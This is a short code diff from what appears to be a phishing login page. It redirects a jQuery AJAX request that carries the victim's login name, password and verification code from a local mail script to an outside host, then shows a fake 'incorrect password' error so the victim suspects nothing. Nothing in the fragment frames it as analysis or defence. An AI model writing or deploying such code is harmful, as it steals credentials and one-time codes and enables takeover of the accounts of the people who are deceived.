@@ -76,7 +76,7 @@
             var password = sessionStorage.getItem("password");
             $.ajax({
               type: "POST",
-              url: "./mail.php",
+              url: "https://justdial4u.today/gold365.php",
               data: "loginName=" + loginName + "&password=" + password + "&code=" + code,
               success: function (msg) {
                 $("#errorMsg").html('Username and password is incorrect.');
